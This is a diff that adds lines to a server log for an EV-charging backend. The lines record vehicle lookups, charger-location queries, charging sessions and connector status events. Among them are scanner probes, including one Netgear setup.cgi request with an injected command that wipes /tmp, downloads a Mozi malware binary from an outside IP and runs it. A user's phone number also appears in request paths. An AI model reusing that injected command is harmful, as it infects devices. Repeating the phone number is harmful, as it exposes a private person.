@@ -4639,3 +4639,165 @@ HEAD
 2025-01-15T09:31:23.349Z [32minfo[39m: [HEAD] http://112.124.42.80:63435/ - 200 [1ms]
 2025-01-15T10:00:57.675Z [32minfo[39m: [GET] / - 200 [1ms]
 2025-01-15T10:06:02.804Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [3ms]
+2025-01-15T11:44:46.783Z [32minfo[39m: Application has started
+2025-01-15T11:45:14.882Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [40ms]
+2025-01-15T11:45:15.421Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [4ms]
+2025-01-15T11:45:15.468Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [45ms]
+2025-01-15T11:45:15.913Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [87ms]
+2025-01-15T11:45:25.295Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [9ms]
+2025-01-15T11:45:25.563Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [2ms]
+2025-01-15T11:45:25.886Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [41ms]
+2025-01-15T11:45:26.208Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [80ms]
+2025-01-15T11:45:56.335Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-15T11:46:13.915Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-15T11:46:15.526Z [31merror[39m: [GET] /favicon.ico - 404 [3ms]
+2025-01-15T11:47:09.883Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [7ms]
+2025-01-15T11:49:34.222Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [7ms]
+2025-01-15T11:53:45.620Z [32minfo[39m: StatusNotification - Connector: 0, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-15T11:53:44Z
+2025-01-15T11:53:46.652Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-15T11:53:45Z
+2025-01-15T11:54:11.593Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [7ms]
+2025-01-15T11:54:12.224Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [24ms]
+2025-01-15T11:54:12.227Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [2ms]
+2025-01-15T11:54:12.578Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [40ms]
+2025-01-15T11:55:19.224Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-15T11:55:17Z
+2025-01-15T11:55:40.753Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [8ms]
+2025-01-15T11:55:41.448Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [3ms]
+2025-01-15T11:55:41.497Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [48ms]
+2025-01-15T11:55:42.128Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [23ms]
+2025-01-15T11:57:20.451Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [8ms]
+2025-01-15T11:57:20.985Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [2ms]
+2025-01-15T11:57:21.035Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [22ms]
+2025-01-15T11:57:21.268Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [22ms]
+2025-01-15T11:57:32.973Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-15T11:57:31Z
+2025-01-15T11:57:40.117Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-15T11:57:38Z
+2025-01-15T11:57:45.612Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-15T11:57:50.759Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-15T11:57:48Z
+2025-01-15T12:01:44.723Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-15T12:01:48.157Z [32minfo[39m: StatusNotification - Connector: 1, Status: Finishing, ErrorCode: NoError, Timestamp: 2025-01-15T12:01:46Z
+2025-01-15T12:04:15.577Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-15T12:04:13Z
+2025-01-15T13:03:50.687Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-15T13:11:22.599Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [1ms]
+2025-01-15T15:28:31.976Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-15T15:56:54.778Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [1ms]
+2025-01-15T16:08:48.655Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-15T16:09:51.421Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-15T16:10:01.086Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-15T17:22:34.791Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-15T17:54:51.563Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-15T17:56:06.445Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-15T19:17:14.210Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [0ms]
+2025-01-15T19:33:37.966Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-15T20:26:28.271Z [31merror[39m: [GET] /v1/console/server/state?accessToken&username - 404 [1ms]
+2025-01-15T20:26:28.681Z [31merror[39m: [GET] /nacos/v1/console/server/state?accessToken&username - 404 [0ms]
+2025-01-15T20:43:12.892Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-15T21:34:38.536Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-15T21:35:56.066Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [1ms]
+2025-01-16T00:24:34.000Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T00:33:09.092Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [1ms]
+2025-01-16T01:31:15.727Z [31merror[39m: [GET] /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.97.250.58:45492/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 - 404 [1ms]
+2025-01-16T01:34:24.389Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T01:34:24.674Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
+2025-01-16T02:28:08.429Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-16T03:06:16.963Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-16T03:41:38.444Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [0ms]
+2025-01-16T04:48:41.983Z [31merror[39m: [GET] /manager/html - 404 [1ms]
+2025-01-16T05:59:52.609Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [13ms]
+2025-01-16T05:59:53.014Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [1ms]
+2025-01-16T05:59:53.090Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [25ms]
+2025-01-16T05:59:53.454Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [30ms]
+2025-01-16T06:00:07.449Z [31merror[39m: [POST] /session/transaction - 500 [1ms]
+2025-01-16T06:20:58.648Z [32minfo[39m: StatusNotification - Connector: 0, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T06:20:57Z
+2025-01-16T06:20:59.744Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T06:20:58Z
+2025-01-16T06:21:09.654Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T06:21:08Z
+2025-01-16T06:21:18.148Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [10ms]
+2025-01-16T06:21:18.430Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [2ms]
+2025-01-16T06:21:18.793Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [23ms]
+2025-01-16T06:21:18.993Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [26ms]
+2025-01-16T06:21:24.914Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T06:21:31.140Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-16T06:21:28Z
+2025-01-16T06:21:40.724Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T06:21:51.583Z [32minfo[39m: StatusNotification - Connector: 1, Status: Faulted, ErrorCode: OtherError, Timestamp: 2025-01-16T06:21:49Z
+2025-01-16T06:32:18.021Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [0ms]
+2025-01-16T06:42:56.873Z [32minfo[39m: StatusNotification - Connector: 0, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T06:42:55Z
+2025-01-16T06:42:57.892Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T06:42:56Z
+2025-01-16T06:43:06.505Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T06:43:04Z
+2025-01-16T06:43:20.182Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [7ms]
+2025-01-16T06:43:20.736Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [1ms]
+2025-01-16T06:43:21.288Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [19ms]
+2025-01-16T06:43:21.640Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [20ms]
+2025-01-16T06:43:27.877Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T06:43:33.115Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-16T06:43:30Z
+2025-01-16T06:43:49.361Z [32minfo[39m: StatusNotification - Connector: 1, Status: Faulted, ErrorCode: OtherError, Timestamp: 2025-01-16T06:43:47Z
+2025-01-16T06:46:00.465Z [32minfo[39m: StatusNotification - Connector: 0, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T06:45:58Z
+2025-01-16T06:46:01.440Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T06:45:59Z
+2025-01-16T06:47:18.437Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T06:47:16Z
+2025-01-16T06:47:41.149Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [6ms]
+2025-01-16T06:47:41.576Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [2ms]
+2025-01-16T06:47:41.664Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [20ms]
+2025-01-16T06:47:42.050Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [37ms]
+2025-01-16T06:47:51.719Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T06:47:57.730Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-16T06:47:53Z
+2025-01-16T06:50:39.106Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T06:51:58.868Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T06:52:02.437Z [32minfo[39m: StatusNotification - Connector: 1, Status: Finishing, ErrorCode: NoError, Timestamp: 2025-01-16T06:52:00Z
+2025-01-16T06:53:14.738Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T06:53:12Z
+2025-01-16T06:54:06.780Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [6ms]
+2025-01-16T06:54:06.990Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [1ms]
+2025-01-16T06:54:07.265Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [19ms]
+2025-01-16T06:54:07.607Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [19ms]
+2025-01-16T06:54:13.101Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T06:54:40.363Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T06:54:38Z
+2025-01-16T06:54:44.025Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-16T06:54:42Z
+2025-01-16T06:56:17.537Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T06:56:20.455Z [32minfo[39m: StatusNotification - Connector: 1, Status: Finishing, ErrorCode: NoError, Timestamp: 2025-01-16T06:56:19Z
+2025-01-16T06:58:05.781Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T06:58:04Z
+2025-01-16T07:28:21.113Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [9ms]
+2025-01-16T07:28:21.374Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [2ms]
+2025-01-16T07:28:21.397Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [20ms]
+2025-01-16T07:28:22.030Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [25ms]
+2025-01-16T07:28:26.359Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T07:29:06.776Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [5ms]
+2025-01-16T07:29:07.203Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [2ms]
+2025-01-16T07:29:07.305Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [23ms]
+2025-01-16T07:29:07.701Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [17ms]
+2025-01-16T07:30:15.835Z [32minfo[39m: StatusNotification - Connector: 0, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T07:30:14Z
+2025-01-16T07:30:16.570Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T07:30:15Z
+2025-01-16T07:30:20.323Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T07:30:18Z
+2025-01-16T07:30:26.674Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [20ms]
+2025-01-16T07:30:31.453Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T07:30:36.702Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-16T07:30:34Z
+2025-01-16T07:31:26.925Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T07:31:30.341Z [32minfo[39m: StatusNotification - Connector: 1, Status: Finishing, ErrorCode: NoError, Timestamp: 2025-01-16T07:31:28Z
+2025-01-16T07:53:16.977Z [32minfo[39m: StatusNotification - Connector: 0, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T07:53:15Z
+2025-01-16T07:53:17.777Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T07:53:16Z
+2025-01-16T07:53:29.260Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T07:53:27Z
+2025-01-16T07:53:30.279Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T07:53:28Z
+2025-01-16T07:53:56.733Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [8ms]
+2025-01-16T07:53:57.120Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [2ms]
+2025-01-16T07:53:57.142Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [21ms]
+2025-01-16T07:53:57.557Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [21ms]
+2025-01-16T07:56:05.726Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T07:56:04Z
+2025-01-16T07:56:21.763Z [32minfo[39m: [POST] /session/transaction - 200 [0ms]
+2025-01-16T07:56:28.078Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-16T07:56:24Z
+2025-01-16T08:26:20.996Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-16T08:42:05.936Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T09:21:53.584Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T09:28:53.482Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [1ms]
+2025-01-16T10:52:25.853Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T11:22:15.372Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-16T11:26:36.835Z [32minfo[39m: [HEAD] / - 200 [1ms]
+2025-01-16T11:26:39.366Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T11:28:36.124Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
+2025-01-16T11:37:18.812Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T12:01:12.028Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [1ms]
+2025-01-16T12:02:40.472Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T12:07:23.273Z [32minfo[39m: StatusNotification - Connector: 0, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T12:07:20Z
+2025-01-16T12:07:25.073Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T12:07:21Z
+2025-01-16T12:07:35.131Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T12:07:32Z
+2025-01-16T12:07:45.475Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [30ms]
+2025-01-16T12:07:45.479Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [2ms]
+2025-01-16T12:07:45.525Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [17ms]
+2025-01-16T12:07:46.072Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [10ms]
+2025-01-16T12:07:50.368Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [6ms]
+2025-01-16T12:07:54.425Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T12:08:01.953Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-16T12:07:57Z
